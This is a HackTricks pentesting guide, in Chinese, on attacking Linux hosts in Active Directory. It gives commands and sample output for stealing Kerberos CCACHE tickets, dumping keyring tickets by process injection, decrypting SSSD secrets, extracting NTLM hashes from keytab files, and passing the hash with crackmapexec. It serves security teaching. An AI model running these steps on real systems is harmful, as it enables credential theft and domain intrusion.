# Linux Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

一个Linux机器也可以存在于Active Directory环境中。

在AD中的Linux机器可能会**在文件中存储不同的CCACHE票据。这些票据可以像其他Kerberos票据一样被使用和滥用**。为了读取这些票据，您需要成为票据的用户所有者或者是机器上的**root**用户。

## 枚举

### 从Linux中枚举AD

如果您在Linux（或Windows的bash）上可以访问AD，您可以尝试使用[https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)来枚举AD。

您还可以查看以下页面，了解**从Linux中枚举AD的其他方法**：

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

这是一个开源的**替代品**，用于Unix环境的集成管理解决方案，主要用作Microsoft Windows **Active** **Directory**的替代品。了解更多信息：

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## 操作票据

### Pass The Ticket

在这个页面上，您将找到不同的地方，您可以**在Linux主机中找到Kerberos票据**，在下一页中，您可以了解如何将这些CCache票据格式转换为Kirbi（在Windows中使用的格式），以及如何执行PTT攻击：

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### 从/tmp目录重用CCACHE票据

> 当票据被设置为存储在磁盘上的文件时，标准格式和类型是CCACHE文件。这是一种简单的二进制文件格式，用于存储Kerberos凭据。这些文件通常存储在/tmp目录中，并具有600权限。

使用`env | grep KRB5CCNAME`命令列出用于身份验证的当前票据。该格式是可移植的，可以通过设置环境变量`export KRB5CCNAME=/tmp/ticket.ccache`来**重用票据**。Kerberos票据的名称格式为`krb5cc_%{uid}`，其中uid是用户的UID。
```bash
ls /tmp/ | grep krb5cc
krb5cc_1000
krb5cc_1569901113
krb5cc_1569901115

export KRB5CCNAME=/tmp/krb5cc_1569901115
```
### 从密钥环中重用CCACHE票证

进程可能会将Kerberos票证存储在其内存中，这个工具可以用来提取这些票证（在机器的`/proc/sys/kernel/yama/ptrace_scope`中应禁用ptrace保护）：[https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
```bash
# Configuration and build
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release

[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in tarlogic[1000] session...
[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[X] [uid:0] Error retrieving tickets
```
### 从SSSD KCM中重用CCACHE票据

SSSD在路径`/var/lib/sss/secrets/secrets.ldb`维护着一个数据库的副本。相应的密钥以隐藏文件的形式存储在路径`/var/lib/sss/secrets/.secrets.mkey`中。默认情况下，只有具有**root**权限的用户才能读取该密钥。

使用`SSSDKCMExtractor`命令并提供--database和--key参数，将解析数据库并**解密密钥**。
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**凭证缓存的Kerberos blob可以转换为可用的Kerberos CCache文件**，可以传递给Mimikatz/Rubeus。

### 从keytab重用CCACHE票据
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### 从 /etc/krb5.keytab 提取账户

通常，以 root 用户身份运行的服务使用的服务密钥存储在 keytab 文件 **`/etc/krb5.keytab`** 中。这个服务密钥相当于服务的密码，必须保持安全。

使用 [`klist`](https://adoptopenjdk.net/?variant=openjdk13\&jvmVariant=hotspot) 命令读取 keytab 文件并解析其内容。当 [密钥类型](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) 为 23 时，你看到的密钥就是实际的 **NT 用户哈希值**。
```
klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
[...]
[26] Service principal: host/COMPUTER@DOMAIN
KVNO: 25
Key type: 23
Key: 31d6cfe0d16ae931b73c59d7e0c089c0
Time stamp: Oct 07,  2019 09:12:02
[...]
```
在Linux上，您可以使用[`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract)工具：我们需要RC4 HMAC哈希来重用NTLM哈希。
```bash
python3 keytabextract.py krb5.keytab
[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
[+] Keytab File successfully imported.
REALM : DOMAIN
SERVICE PRINCIPAL : host/computer.domain
NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
```
在 **macOS** 上，您可以使用 [**`bifrost`**](https://github.com/its-a-feature/bifrost)。
```bash
./bifrost -action dump -source keytab -path test
```
使用CME连接到机器，使用账户和哈希值。
```bash
$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0
```
## 参考资料

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
